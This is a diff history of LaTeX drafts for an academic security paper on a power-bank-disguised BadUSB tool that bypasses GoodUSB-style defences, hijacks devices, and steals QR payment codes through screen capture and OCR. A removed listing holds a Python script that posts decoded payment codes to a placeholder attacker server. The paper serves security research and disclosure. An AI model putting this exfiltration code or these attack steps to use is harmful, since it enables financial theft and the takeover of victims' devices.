+It is worth mentioning that, those \textit{secure keyboards} built in some financial apps just disrupt keyboard sequences, they can't prevent attacks similar as \tool.
 
-\begin{table*}[hbtp]
+\begin{table*}[t]
 	\centering

### 2021-01-24 WOOT/Files/experiment.tex
Minor
revision of experiment

@@
 %\shuqing{Experiment for devices and case study needed.}
-To evaluate the effectiveness of \tool, we conducted experiments in the three modes introduced in the Section~\ref{sec:badusb} on devices with USB Type-C capabilities.
+To evaluate the effectiveness of \tool in different modes, we conducted three experiments on \tool using devices with USB Type-C capabilities from different OEMs, including a mobile phone, a tablet and a laptop.
 
-\textit{Setup.} Our implementation contains a USB Type-C hub with HDMI and USB port, a Raspberry Pi 4B with a Wi-Fi chip onboard, a video capture card adapting HDMI signal to USB camera, and a normal power bank with dual outputs.
+\textit{Setup.} As mentioned in Section~\ref{sec:badusb}, our \tool only requires common components that are easily accessible online or in any electronic store.
+Here we choose the following parts to build a prototype.
+To begin with, we choose the Raspberry Pi 4B as the embedded computer inside \tool, which is powerful enough to process video data and has onboard WiFi chip.
+As for the HID emulator, we decide to use a ATMEGA32U4 board with USB protocol support.
+This Atmel chip is able to emulate most HID devices with our modified firmware.
+About the USB 3.x hub, we uses one from the Yamazawa, which supports HDMI, USB 2.0, and many other exported peripheral.
+Apart from these essential parts, we also uses an auxiliary power-bank to provide power for the Raspberry Pi and the mobile devices used by the victim.
+The image of our prototype \tool can be found in Figure~\ref{fig:armory}.
 \shuqing{Figures of our power bank.}
-The power bank is used to supply the Raspberry Pi 4B and charge the victim's devices.
-The USB Type-C hub adapts USB Type-C to a HDMI port and USB ports, which is used to connect HID devices and transmit video stream from victim's devices to HDMI port. 
-The video stream will be captured by the Raspberry Pi 4B through the video capture card.
-Note that in the following experiments, we chose different types of devices, i.e., smartphones, PCs and iPads, to conduct experiments in different modes to validate the usability and effectiveness of \tool.
 
@@
 
-We used \textit{Lenovo Xiaoxin Pro 13 2020}, a PC in Windows 10 with two USB Type-C interfaces as target device while conducting the experiment in scripting mode. 
-In this experiment, \tool disguised itself as a normal keyboard.
-Similar as BadUSB~\cite{badusb}, \tool injected keystrokes at a high speed to start a terminal (cmd.exe) by hotkey, and executed the malicious scripts in it.
-Through executing scripts, \tool could implant viruses, worms, backdoors, etc. into hosts, which would make the victim's devices under significant risk.
-However, scripting mode can only be used on devices which terminal is available, limiting its capabilities to PC.
+In the experiment of scripting mode, we used \textit{Lenovo Xiaoxin Pro 13 2020}, a PC in Windows 10 with two USB Type-C interfaces as target device. 
+In this experiment, \tool disguised itself as a normal keyboard and a home-brewed version of GoodUSB\cite{tian2015defending} is deployed to test the defense bypassing.
+At the beginning, our home-brewed version of GoodUSB asked victim to manually complete a CAPTCHA to  authorize the new USB device, a.k.a our \tool.
+But at this time, by the design of GoodUSB, our \tool can already perform limited keystroke to complete the CAPTCHA and will be rejected only after the failure of authorization.
+With the video feedback from \tool, the attacker successfully completes the CAPTCHA.
+Up to this point, the bypass of defense like GoodUSB is completed as our \tool already gain full function from the GoodUSB and become a trusted device.
+Then, our \tool works similar to the original BadUSB, inserting keystroke to perform arbitrary execution on the laptop.
+We tested three scripts, ranging from reverse shell backdoor to malware payload execution, all of which resulting in success.
 
 \subsection{Remote control mode}
+
 We chose \textit{iPad Pro (3rd generation)}, a tablet in iOS 14.3 with a USB Type-C interface, as the target device in this experiment.
@@
 \ding{185} After confirmation, the payment service provider proceed with this transaction and return the payment result to both the payee and the payer.
-\shuqing{I think this paragraph can be shorter. No need to explain so much details.}
+\shuqing{I think this paragraph can be shorter. No need to explain so many details.}
 

### 2021-01-24 WOOT/Files/experiment.tex
minor change in script mode exp

@@
 
-In the experiment of scripting mode, we used \textit{Lenovo Xiaoxin Pro 13 2020}, a PC in Windows 10 with two USB Type-C interfaces as target device. 
+In the experiment of scripting mode, we used \textit{Lenovo Xiaoxin Pro 13 2020}, a PC in Windows 10/Ubuntu OS with two USB Type-C interfaces as target device. 
 In this experiment, \tool disguised itself as a normal keyboard and a home-brewed version of GoodUSB\cite{tian2015defending} is deployed to test the defense bypassing.
+We have tried to deploy the original GoodUSB on the target device, but as the GoodUSB is proposed in 2015 and the code is too outdated to run at modern OS.
+We have to home-brew a similar defense mechanism according to its paper.
 At the beginning, our home-brewed version of GoodUSB asked victim to manually complete a CAPTCHA to  authorize the new USB device, a.k.a our \tool.

### 2021-01-24 WOOT/Files/experiment.tex
finish first 3 experiment

@@
 \subsection{Scripting mode}
-
 In the experiment of scripting mode, we used \textit{Lenovo Xiaoxin Pro 13 2020}, a PC in Windows 10/Ubuntu OS with two USB Type-C interfaces as target device. 
-In this experiment, \tool disguised itself as a normal keyboard and a home-brewed version of GoodUSB\cite{tian2015defending} is deployed to test the defense bypassing.
+During this experiment, \tool disguised itself as a normal keyboard and a home-brewed version of GoodUSB\cite{tian2015defending} is deployed to test the defense bypassing.
 We have tried to deploy the original GoodUSB on the target device, but as the GoodUSB is proposed in 2015 and the code is too outdated to run at modern OS.
@@
 
+With this experiment, we have proven the defense bypassing is possible using \tool. This also warned us that we need more thorough defense against such BadUSB attack.
+
 \subsection{Remote control mode}
+To test the capability of remote control mode, we chose \textit{iPad Pro (3rd generation)}, a tablet in iOS 14.3 with a USB Type-C interface, as the target device in this experiment.
+Besides disguising as normal HID devices like a conventional BadUSB~\cite{badusb}, \tool also transmitted real-time video stream from the target device to the attacker via WiFi.
+After the connection establishment, attacker performed a series actions to test the capability of \tool.
+At the beginning, attacker accessed album application on the iPad and obtained all the photos inside.
+After that, attacker tried to send messages via victim's account.
+At last, attacker performed a small amount of transaction using the financial application.
+All of these tests resulted in success and proved that \tool is a powerful attack tool.
 
-We chose \textit{iPad Pro (3rd generation)}, a tablet in iOS 14.3 with a USB Type-C interface, as the target device in this experiment.
-Besides performing as normal HID devices as conventional BadUSB~\cite{badusb}, \tool could transmit real-time video streaming of screen from the target device to the attacker through WiFi or GSM.
-\tool captured video from USB Type-C Hub's HDMI output via a video capture card, streamed video with \textit{FFmpeg}, a video processing utility and uploaded video stream to the attacker's device.
-With a real-time video stream as an indicator, attackers can precisely control the position of mouse movements and clicks, controlling the iPad to open applications, peek at the victim's photos, etc.
-
-Remote control mode is ideal for the attackers to control the victim's devices and grab all information shown on the victim's devices. 
-However, it needs user consent for the first time and requires high power consumption to encode video streams and stable network connections.
-In the real world, high power consumption will increase the possibilities of being noticed by the victim, and stable network connections is hardly guaranteed.
+Through this experiment, we have found that with video transmission and mouse emulation, \tool extensively expanded the attack surface of BadUSB attack, especially in mobile devices.
+We have archived complete hijack of victim's device in this experiment.
 
 \subsection{Privacy extraction mode}
-We chose \textit{HUAWEI P30}, a smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, as the target device in this experiment.
-As remote control mode, \tool captured video from the victim's device and use \textit{opencv} to identify valuable information from video stream. 
+During the experiment of privacy extraction, we chose \textit{HUAWEI P30}, a smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, as the target device.
+In privacy extraction mode, \tool passively captured video from the victim's device and used \textit{OpenCV} to identify valuable information from video stream. 
 When the victim viewed text or photos with text, \tool used the techniques of optical character recognition (OCR) to extract text from corresponding video frames.
-\yechang{hyperlink to OCR?}\shuqing{I think we don't need to explain OCR nor put a reference link.}
-For example, we extracted the victim's name, photo, address, and ID number when victim is viewing his/her photos of his/her ID card or passport documents,
-We also extracted the victim's payment information when victim is using bank apps or payment apps.
-Besides, \tool used \textit{opencv} to detect and decode QR codes or barcodes shown on the victim's device, which is expected to extract payment code information in the payment apps.
-Here is an example of extracting payment code with opencv library in listing. \shuqing{Need to be modified.}\shuqing{Do we plan to add this?}
+In this experiment, attacker had successfully extracted text like name, address, ID number and other valuable personal information.
+We also tested the payment code extractor, which enables attacker to identify payment code in the video stream and perform transaction without password.
+As this is also a part of our case study, more details about the data extracted can be found in Section~\ref{subsec:case_study} and Table~\ref{table:information_extracted}.
 
-Privacy extraction mode only extracts valuable information for attackers (or highly sensitive information for victims), which is more efficient  than remote control mode.
-
-%\begin{lstlisting}[caption={python script for extracting payment code of victim},label=lst2:qr]
-%import cv2, qrcode,requests
-%import pyzbar.pyzbar as pyzbar
-%def decodeDisplay(video):
-%    gray = cv2.cvtColor(video, cv2.COLOR_BGR2GRAY)
-%    barcodes = pyzbar.decode(gray)
-%    for barcode in barcodes:
-%        barData = barcode.data.decode()
-%        barType = barcode.type
-%        requests.post('<server of attacker>',
-%            data={
-%                'data': barData,
-%                'type': barType
-%            }
-%        )
-%if __name__ == '__main__':
-%    cam = cv2.VideoCapture(0)
-%    while True:
-%        ret, frame = cam.read()
-%        decodeDisplay(frame)
-%        if cv2.waitKey(5) == 27:
-%            break
-%    cam.release()
-%    cv2.destroyAllWindows()
-%\end{lstlisting}
+After the experiment, we have found that as privacy extraction mode only passively process victim's video stream, this is a more power-efficient mode than remote control mode.
 
 \subsection{Case study}
-
+\label{subsec:case_study}
 \subsubsection{Background}

### 2021-01-24 WOOT/Files/introduction.tex
Update many parts

@@
 It provides a graphical interface for user to describe the functionalities or roles of the USB device and reject any usage beyond the description.
-\shuqing{Can't bypass USBCheckIn.}
+%\shuqing{Can't bypass USBCheckIn.}
 
@@
 To improve the efficiency and performance of \tool, we designed a filtering algorithm to preprocess the video data before network transmission.
-After implementation, we conducted a series of experiments for each attack mode.
-\shuqing{Case study, evaluation, notable results.}
+Moreover, we conducted a series of experiments for each attack mode as well as for different types of devices, including smartphones, personal computers and tablet computers, in order to validate the usability of \tool.
+At last, we conducted a user study for attacks in sharing power banks, one of the application scenarios of \tool.
+During the user study, we obtained plenty of privacy data through \tool, since users are usually unconscious of the necessity to check the USB devices they plugged in for security purposes.
+%\shuqing{Case study, evaluation, notable results.}
 
@@
 	\item Our approach can bypass most of the previous countermeasures of BadUSB.
-	\item \shuqing{Experiment, evaluation, notable results.}
+	\item We conducted multiple experiments and a user study to validate the usability and effectiveness of \tool. \shuqing{Notable results.}
 \end{itemize}

### 2021-01-24 WOOT/Files/introduction.tex
Update intro

@@
 
-The rest of this paper is structured as follows:
-\shuqing{Fill in after the structure is finalized.}
+The rest of this paper is structured as follows.
+Section~\ref{sec:background} provides the background of USB specification.
+Section~\ref{sec:related_work} introduces the existing work of USB security from the aspects of attacking and defence respectively.
+In Section~\ref{sec:badusb}, we present the threat model and the overall implementation of \tool in three different modes.
+The experiments and user study we conducted are featured in Section~\ref{sec:experiment}.
+We presents the possible countermeasures of \tool in Section~\ref{sec:countermeasures}.
+The limits and impacts of our approach are discussed in Section~\ref{sec:discussion}, and the conclusion lies in Section~\ref{sec:conclusion}.
+%\shuqing{Fill in after the structure is finalized.}

### 2021-01-24 WOOT/Files/discussion.tex
Update impact

@@
 \subsection{Impact}
+%\shuqing{Left after experiment to finish. Will discuss from different modes and application scenarios.}
+The USB protocol is used widely as introduced in preceding sections.
+As the technologies develops rapidly, more and more devices will be equipped with USB-C capabilities, which makes \tool more influential.
+Due to the neglection to check the security of plugged-in USB devices of non-professional users, \tool can be hardly detected by them while attacks are performing.
+The popularity and universality of public USB devices, including sharing power banks, even increase such risks.
+What's more, \tool provides a better way for traditional BadUSB attacks, since attackers can obtain the screen streaming with ease.
+Attackers can use such technologies to perform more precise attacks, such as interacting with user interface, as well as control the consequences of their attacks.
+In summary, \tool can be applied in various application scenarios and brings rather huge impacts.

### 2021-01-24 WOOT/Files/background.tex
add figures, add new counter measure
Figures

@@
 \label{sec:background}
-\shuqing{Maybe we could introduce HID devices somewhere.}
-\noindent\outline{USB Standard}\\
+%\shuqing{Maybe we could introduce HID devices somewhere.}
+%\noindent\outline{USB Standard}\\
 We first introduce the development of USB specification and emphasize the key points adopted in our work.
@@
 
-\noindent\outline{USB1.x}\\
+%\noindent\outline{USB1.x}\\
 Proposed in 1996, USB 1.0\cite{usb10} was developed to provide an unified interface and thus reducing the cost of re-configuring the software.
@@
 
-\noindent\outline{HID Protocol}\\
-Right after one year of the appearance of USB 1.0, a standard named HID (\emph{Human Interface Device})\hongyi{Citation Needed} was born on the basis of USB.
+%\noindent\outline{HID Protocol}\\
+Right after one year of the appearance of USB 1.0, a standard named HID (Human Interface Device)\hongyi{Citation Needed} was born on the basis of USB.
 HID is designed with the goal of unifying the implementation for devices like mouse, keyboard and so on.
@@
 
-USB1.x\cite{usb10}\cite{usb11} provided two data transfer rates which are Low Speed (1.5 Mbit/s) and Full Speed (12 MBit/s).
+In 1998, the first widely supported USB protocol was born.
+USB1.1\cite{usb11} provided two data transfer rates which are Low Speed (1.5 Mbit/s) and Full Speed (12 MBit/s).
 At this point, due to the transfer limit, it only supports limited kinds of devices like keyboard, mice, etc.
 
-\noindent\outline{USB2.0}\\
+%\noindent\outline{USB2.0}\\
 In 2000, USB 2.0\cite{usb20} specification was released.
@@
 
-\noindent\outline{USB3.x}\\
+%\noindent\outline{USB3.x}\\
 USB 3.0\cite{usb30} was announced in 2008, with a Super Speed (5 Gbit/s) data transfer rate.
@@
 
-\noindent\outline{Connector Standard}
-\begin{figure}[hbtp]
-	\includegraphics[width=\linewidth]{./Figs/usb_conn.png}
+%\noindent\outline{Connector Standard}
+\begin{figure}[t]
+    \centering
+	\includegraphics[width=0.7\linewidth]{./Figs/usb_conn.png}
 	\caption{USB 1.x \& 2.x Connector}
@@
 Apart from that, support for other peripheral also requires dedicated transferring lane as their standards are not compatible with USB in most cases.
-\begin{figure}[hbtp]
+\begin{figure}[t]
+	\centering
 	\includegraphics[width=\linewidth]{./Figs/usb_c_conn.png}
@@
 
-\noindent\outline{Security Problem}\\
+%\noindent\outline{Security Problem}\\
 During the development of USB specification, security was rarely considered.

### 2021-01-24 WOOT/Files/discussion.tex

@@
 Moreover, most of the devices will prompt users to give authentication to the USB devices or select one of the functional modes after they are plugged in.
-Though some of such prompts are not conspicuous for non-experts, especially when \tool is concealed within other functional hardware such as portable battery \shuqing{If there is experiment, add it here.}, the probability whether users could get aware that something unusual happens will increase with the existence these prompting messages.
+Though some of such prompts are not conspicuous for non-experts, especially when \tool is concealed within other functional hardware such as power banks \shuqing{If there is experiment, add it here.}, the probability whether users could get aware that something unusual happens will increase with the existence these prompting messages.
 

### 2021-01-25 WOOT/Files/badusb.tex
Figure

@@
 As the USB 3.x standard is more and more common nowadays, this assumption can be easily fulfilled especially in recent devices.
-\subsection{Motivation}
-\noindent\outline{Limitation of Rubber Ducky}\\
-\outline{Our functionality different mode listing?}\\
-\hongyi{The following mode is to be further decided}
-\outline{Automatic Scripting Mode}\\
-\outline{Remote Control Mode}\\
-\outline{OCR/QR Recognition Mode}\\
-As we introduced in the Section~\ref{sec:related_work}, there are plenty of existing work \shuqing{Add citation} focusing on BadUSB attack. 
+
+%\subsection{Motivation}
+%\noindent\outline{Limitation of Rubber Ducky}\\
+%\outline{Our functionality different mode listing?}\\
+%\hongyi{The following mode is to be further decided}
+%\outline{Automatic Scripting Mode}\\
+%\outline{Remote Control Mode}\\
+%\outline{OCR/QR Recognition Mode}\\
+
+\subsection{Implementation}
+%\noindent\hongyi{The following mode is to be further decided}\\
+%\outline{DETAIL of each mode}\\
+%\outline{Automatic Scripting Mode}\\
+%\outline{Remote Control Mode}\\
+%\outline{OCR/QR Recognition Mode}\\
+As we introduced in Section~\ref{sec:related_work}, there are plenty of existing work~\cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} focusing on BadUSB attack. 
 Many of these take advantage of the \textit{trust-by-default} policy of PC, pretend to be normal HID devices and utilize USB protocol to perform attacks. 
@@
 
-\subsection{Implementation}
-\noindent\hongyi{The following mode is to be further decided}\\
-\outline{DETAIL of each mode}\\
-\outline{Automatic Scripting Mode}\\
-\outline{Remote Control Mode}\\
-\outline{OCR/QR Recognition Mode}\\
-Though BadUSB devices\cite{badusb} like Rubber Ducky\cite{rubber, rubberducky2020} emulates as a HID device enabling various arbitrary execution attacks, fetching feedback from the victim is much more limited.
-Based on this restriction, several defense mechanisms were proposed  like GoodUSB\cite{tian2015defending}.
+%Though BadUSB devices\cite{badusb} like Rubber Ducky\cite{rubber, rubberducky2020} emulates as a HID device enabling various arbitrary execution attacks, fetching feedback from the victim is much more limited.
+Based on the drawbacks introduced above, several defense mechanisms were proposed, like GoodUSB\cite{tian2015defending}.
 These defense mechanism implemented a CAPTCHA-like\cite{captcha} procedure, which requires user to complete certain challenges when a unknown HID device is plugged in.
@@
 \end{itemize}
-\begin{figure}[htbp]
+\begin{figure}[t]
 	\centering
-	\includegraphics[width=0.75\linewidth]{./Figs/attack_model.png}
-	\caption{Attack Model}\shuqing{Need to be more compact.}
+	\includegraphics[width=0.56\linewidth]{./Figs/attack_model.png}
+	\caption{Attack Model}%\shuqing{Need to be more compact.}
 	\label{fig:attack_model}
@@
 Moreover, this mode provides a backdoor that does not require host network and thus is undetectable by the firewall running on the host machine.
-\hongyi{I think this is a quite good selling point?}\shuqing{Agree with Hongyi.}
+%\hongyi{I think this is a quite good selling point?}\shuqing{Agree with Hongyi.}
 

### 2021-01-25 WOOT/Files/experiment.tex
[eperiment] photo of armory

@@
 \subsubsection{Background}
-
-We conducted a case study with sharing power bank and QR code payment as technical background.
+We first introduce the technical background of our case study, sharing power bank service and QR code payment.
 
@@
 Sharing power bank provides users with short-term rental of power banks. 
-The provider deploys power bank stations in the city, while the users can rent a power bank from any of the power bank station, charge their device on the trip, return the rented power bank to another station, and pay the rent online.
+The company deploys power bank stations in the city and users can rent a power bank from any of the power bank station, charge their device on the trip, return the rented power bank to the near station and pay the rent fee.
 
-As an example, Brick is such a power bank sharing service provider from Sweden. 
-As Brick's website states, \textit{Brick prevents your electronics from running out of battery with power banks (Bricks) that you can easily rent \& return at our many stations in Stockholm, Gothenburg, Malmö and the rest of Sweden and even Europe.}.
-\yechang{citation needed}
+For an example, Brick is such a power bank sharing service provider from Sweden.
+It provides power bank rental service all over the Sweden and is planning on expanding their service around Europe.
+What's more, this service is even more popular in China, there are these stations being deployed in almost every market, store and even newsstand.
+This suggests that this service is becoming more and more common around the global, especially in China and Europe.
 \shuqing{I think we should paraphrase instead of using the descriptions on the website directly. Just to explain \textbf{what we need}.}
@@
 
-Though it provides convenience to users, it also brings security issues. 
-We noticed that most of the power bank stations do not check the integrity of power banks during the rental process, and users are hardly cautious to check the power banks when connecting their devices to them.
-The attackers are able to modify their rented power banks, return it to a power bank station as normal.
-Then the subsequent users will unknowingly connect to such malicious power banks, which endangers the financial security and data security of users.
+Not only does sharing power bank provides convenience to users, but it also brings security issues. 
+We noticed that most of the power bank stations do not check the integrity of power banks during the rental process, and users are hardly cautious to check the power banks when connecting their devices.
+An attacker are able to modify his/her rented power banks and return it to a power bank station.
+Then the next user will unknowingly connect to such a malicious power bank, which endangers his/her financial and data security.
 
 \textbf{QR Code Payment}. 
-QR code payment is a method of paying bills, typically performed as the following steps:
-\ding{182} The payer opens the payment application on his/her mobile device, and present his/her payment QR code to the payee. 
-This QR code is encoded with a globally unique ID to identify the payer's account. 
-\ding{183} The payee scan the payment QR code presented by the payer. 
-By presenting this QR code, the payer authorizes proceeding with the payment.
-\ding{184} An order generated by this scan is sent to the payment service provider. 
-Then the payment service provider requests the payer to confirm the transaction.
-\ding{185} After confirmation, the payment service provider proceed with this transaction and return the payment result to both the payee and the payer.
+QR code payment is a new type of payment method that are popular in China.
+Its most well known cases are WeChat Pay and Alipay.
+QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
+This explains why it becoming widely used in China.
+QR code payment is typically performed in the following steps:
+\ding{182} The client presents payment QR code on mobile device to the merchant. 
+The QR code is encoded with a globally unique ID to identify the client's account. 
+\ding{183} The merchant scans the payment QR code and charges corresponding amount of money. 
+By presenting this QR code, the client authorizes proceeding charge.
+\ding{184} An transaction generated by this scan is sent to the payment service provider. 
+Then the payment service provider requests the client to confirm the transaction.
+\ding{185} After confirmation, the payment service provider proceed with this transaction and return the payment result to both the merchant and the client.
 \shuqing{I think this paragraph can be shorter. No need to explain so many details.}
+\hongyi{Dont know how to be more concise.}
 
@@
 A micropayment is pre-determined by the payment service provider with thresholds in the user agreement. 
-For example, WeChat Pay~\cite{Wechat-pay} regards payments less than CNY \textyen 1000 as micropayments. 
-Different from a typical payment procedure, when micropayments are made, confirmations can be applied automatically without requiring the payer to take further actions, which is often encouraged by the payment service provider.
-The payment QR code is associated with the payer's account. 
-If a victim's payment code is leaked to the attackers, they can use the that payment code to proceed payments. 
-Furthermore, the attackers can use several micropayments to steal money from the victim's account, leaving the victim unconscious. 
+For example, WeChat Pay~\cite{Wechat-pay} regards transaction under USD \textdollar 154 as micropayments. 
+Different from a typical payment procedure, when micropayments are made, confirmations can be applied automatically without clients' permission which aims to provide convenience to both merchant and client.
+If a victim's payment code is leaked to the attackers, they can use the that code to authorize multiple micropayments without permission. 
+In order to prevent such cases, both Alipay and WeChat Pay has designed a refreshing mechanism for the payment code, which is to refresh the QR code every minute.
+This is sufficient to stop attack like sneak shots, but unable to stop real-time attack like our \tool.
 \shuqing{Introduce something about QR code refreshing (fast).}
-In summary, the payment QR code is highly sensitive on users' devices.
+In summary, the payment QR code is highly sensitive on users' devices and our following case study is about how to obtain this code using modified power bank, our \tool.
 
@@
 
-Note that \tool only exposes a type-c cable (from USB Type-C hub).
-It charges the attacker's device through this cable, which has no difference from ordinary power banks. 
-Considering users' vigilance and high similarity between \tool and normal power banks, the attackers can put the modified power banks (e.g., \tool) in a power bank station.
-Subsequent users may unconsciously connect their devices to \tool.
-Like many outdoor mobile phone usage scenarios\shuqing{Any reference? How frequent the payment code is used?}, the victim may complete payment with showing payment code. 
+Note that \tool only exposes a USB Type C cable (from USB Type-C hub), which looks just like a normal power bank.
+With the internal battery, \tool can provide sufficient power for both itself and the victim's device.
+Considering normal users' vigilance and the high similarity between \tool and power banks, the attackers can easily put the modified power banks (e.g., \tool) in a power bank station.
+Other users may unconsciously connect their devices to \tool.
+As the QR code payment is fairly common\shuqing{Any reference? How frequent the payment code is used?}, the victim may complete payment by showing their payment code. 
 Then the attackers can extract and use the victim's payment code to make another payment unknown to the victim.

### 2021-01-25 WOOT/Files/introduction.tex

@@
 On the other side of the coin, the security of USB has caused serious problems.
-The designers of USB protocol did not care much about security issues as they wanted to make a easy-to-use protocol.
+The designers of USB protocol did not care much about security issues as they wanted to make an easy-to-use protocol.
 There are more than four hundred vulnerabilities referencing USB on CVE list~\cite{website:CVE-list}.
@@
 Typical simulated devices include HID (short for human interface devices, including keyboards, mice, etc.) and disks.
-Utilizing BadUSB, attackers can pretend themselves as normal users, typing malicious code to victim computers, downloading and executing malicious scripts, and copying out private data from disks.
-Such attacks can easily escape from traditional anti-virus software, since it is very hard to distinguish them from normal USB devices.
+Utilizing BadUSB, attackers can pretend themselves as normal users, typing malicious commands to victim computers, downloading and executing malicious scripts, and copying out private data from disks.
+Such attacks can easily escape from traditional anti-virus software, since it is hard to distinguish them from normal USB devices.
 
 Despite the advantageous features of BadUSB, there exist several limitations as follows.
-(1) Attackers can't conduct attacks precisely, which decreases the capabilities of BadUSB attacks.
+(1) Attackers cannot conduct attacks precisely, which decreases the capabilities of BadUSB attacks.
 When performing attacks on another host, the attackers can not obtain the current user interface (UI) status which limits them from taking subsequent moves.
@@
 The releasing of USB 3.0 makes USB more powerful, with a higher transmission rate for data and the support towards a larger range of peripherals including DisplayPort, HDMI, PowerDelivery, etc.
-BadUSB attacks can become more effective with the help of USB 3.0.
+BadUSB attacks can become more effective with the help of newly supported features in USB 3.0.
 (3) There have emerged multiple efficacious countermeasures after the appearance of BadUSB.
@@
 We did experiments to verify that \tool could also bypass most of the countermeasures for BadUSB since they often rely on interaction with the graphical interface.
-Moreover, we implemented multiple attacking modes of USB attacks based on our approach to verify its effectiveness, including scripting, remote control and privacy extraction.
+Moreover, we implemented multiple attacking modes of USB attacks based on our approach to verify its effectiveness, including scripting, remote control, and privacy extraction.
 To improve the efficiency and performance of \tool, we designed a filtering algorithm to preprocess the video data before network transmission.
-Moreover, we conducted a series of experiments for each attack mode as well as for different types of devices, including smartphones, personal computers and tablet computers, in order to validate the usability of \tool.
+Moreover, we conducted a series of experiments for each attack mode as well as for different types of devices, including smart phones, personal computers, and tablet computers, to validate the usability of \tool.
 At last, we conducted a user study for attacks in sharing power banks, one of the application scenarios of \tool.
-During the user study, we obtained plenty of privacy data through \tool, since users are usually unconscious of the necessity to check the USB devices they plugged in for security purposes.
+During the user study, we obtained plenty of sensitive data through \tool, since users are usually unconscious of the necessity to check the USB devices they plugged in for security purposes.
 %\shuqing{Case study, evaluation, notable results.}
@@
 	\item Our approach can bypass most of the previous countermeasures of BadUSB.
-	\item We conducted multiple experiments and a user study to validate the usability and effectiveness of \tool. \shuqing{Notable results.}
+	\item We conducted multiple experiments and a user study to validate the usability and effectiveness of \tool.
+\shuqing{Notable results.} \fengwei{Add countermeasures, in particular the isolation design.}
 \end{itemize}

### 2021-01-25 WOOT/Files/experiment.tex
revision of case study

@@
 We noticed that most of the power bank stations do not check the integrity of power banks during the rental process, and users are hardly cautious to check the power banks when connecting their devices.
-An attacker are able to modify his/her rented power banks and return it to a power bank station.
-Then the next user will unknowingly connect to such a malicious power bank, which endangers his/her financial and data security.
+An attacker are able to modify his/her rented power banks and return it to a power bank station causing potential threat to subsequent users.
 
@@
 \subsubsection{Attack Scenario}
+In this part, we will introduce a real life attack scenario to prove that our \tool is a practical offensive tool.
+This scenario can be decomposed into the following steps.
+\begin{enumerate}[I. ]
+	\item The attacker rents a power bank from any power bank stations and replace the internal components with our \tool.
+	\item The attacker returns modified power bank to another power bank station in a crowded area like airport or railway station.
+	\item Other users borrows the modified power bank and connects it to their own devices, becoming the victim of \tool.
+	\item The attacker now has complete control over victim's device.
+\end{enumerate}
 

### 2021-01-25 WOOT/Files/related_work.tex

--- 2021-01-23 WOOT/Files/related_work.tex
@@
 \label{sec:related_work}
-\hongyi{Move the stuff about USB protocol to Background}\\
-\outline{Attack based on USB 1.0, briefly}\\
-\outline{Attack based on USB 2.0, focus on works about application and transport layer}\\
-\outline{Attack survey table}\\
-\outline{Attack or current works about USB Type-C}\\
+%\hongyi{Move the stuff about USB protocol to Background}\\
+%\outline{Attack based on USB 1.0, briefly}\\
+%\outline{Attack based on USB 2.0, focus on works about application and transport layer}\\
+%\outline{Attack survey table}\\
+%\outline{Attack or current works about USB Type-C}\\
 

### 2021-01-25 WOOT/Files/experiment.tex
revision of experiment

@@
 The image of our prototype \tool can be found in Figure~\ref{fig:armory}.
-\shuqing{Figures of our power bank.}
 
+\begin{figure}[t]
+	\centering
+	\includegraphics[width=.98\linewidth]{./Figs/armory_all.png}
+	\caption{\tool}
+	\label{fig:PBS_products}
+\end{figure}
 \subsection{Scripting mode}
@@
 This is sufficient to stop attack like sneak shots, but unable to stop real-time attack like our \tool.
-\shuqing{Introduce something about QR code refreshing (fast).}
 In summary, the payment QR code is highly sensitive on users' devices and our following case study is about how to obtain this code using modified power bank, our \tool.
@@
 \begin{enumerate}[I. ]
-	\item The attacker rents a power bank from any power bank stations and replace the internal components with our \tool.
-	\item The attacker returns modified power bank to another power bank station in a crowded area like airport or railway station.
+	\item The attacker rents a power bank from one of power bank stations and replace the internal components with our \tool.
+	\item After the modification, \tool is returned to another power bank station in a crowded area like airport or railway station, which increases the probability of success.
 	\item Other users borrows the modified power bank and connects it to their own devices, becoming the victim of \tool.
-	\item The attacker now has complete control over victim's device.
+	\item The attacker now has complete control over victim and can perform various attack using different modes.
 \end{enumerate}
-
-Note that \tool only exposes a USB Type C cable (from USB Type-C hub), which looks just like a normal power bank.
-With the internal battery, \tool can provide sufficient power for both itself and the victim's device.
-Considering normal users' vigilance and the high similarity between \tool and power banks, the attackers can easily put the modified power banks (e.g., \tool) in a power bank station.
-Other users may unconsciously connect their devices to \tool.
-As the QR code payment is fairly common\shuqing{Any reference? How frequent the payment code is used?}, the victim may complete payment by showing their payment code. 
-Then the attackers can extract and use the victim's payment code to make another payment unknown to the victim.
-\shuqing{This paragraph is duplicate with some previous paragraphs. We can make the previous introduction abut attack scenario really brief, and mainly introduce it here.}
+Here we summarizes the possible threats toward user under different modes. \hongyi{Better way to express this?}
+First, under scripting mode, the attacker is able to implant malware and backdoor script into victims' devices.
+Moreover, using privacy extraction mode, once the victims access their private data like QR payment  code or album, their private data will be immediately transmitted via \tool to the attacker.
+Lastly, with remote control mode, the attacker has complete control over the victims' device and can do anything they want.
 
 \shuqing{Background is longer than real user study.}
-In order to validate the usability of \tool, we conducted a user study in privacy extraction mode. 
+As the functionality and effectiveness of scripting mode and remote control mode is rather clear, the former works similar to original BadUSB, the latter hijacks the victim's device completely.\hongyi{I dont know if it's a good enough reason}
+Here we only validate the usability of privacy extraction mode and conducted a user study.
 \shuqing{10 volunteers.}
-We invited 6 volunteers to take part in, who are unconscious of the experiment details.
-Volunteers took turns to operate their phones for half an hour while \tool is connected, which they considered as a normal power bank.
-After the study, we introduced to them about our attack, checked the screen recordings together, and get the permission to study the information in recorded videos.
+We invited 6 volunteers to participate, who are unconscious of \tool details.
+Before the experiment, we disclose to the volunteers about how their data might be used and request permission from both the volunteers and the institutional ethics review boards.
+During the experiment, volunteers took turns to use their phones for half an hour with \tool connected, which are considered as a normal power bank.
+In order to obtain data close to real life, they are requested to use phones just like when they use the shared power bank outside.
+After the experiment, we introduced to them about our attack, analyze the screen recordings together to make sure their personal data is not at risk.
 \shuqing{Do we need to mention that agreement the conference required here?}
-Subject to efficiency reasons, we asked them to use phones just like when they use the shared power bank outside.
-\shuqing{What does it mean?}
+\hongyi{I'm also quite concern about this.}
 
 \subsubsection{Result}
-
-After collecting the videos, we analyzed the videos both automatically and manually. 
+After collecting the videos, we analyzed the video both automatically and manually.
 During the automatic analysis, we used scripts to perform OCR recognition for each frame in the recorded video and stored all of the OCR results in a database.
@@
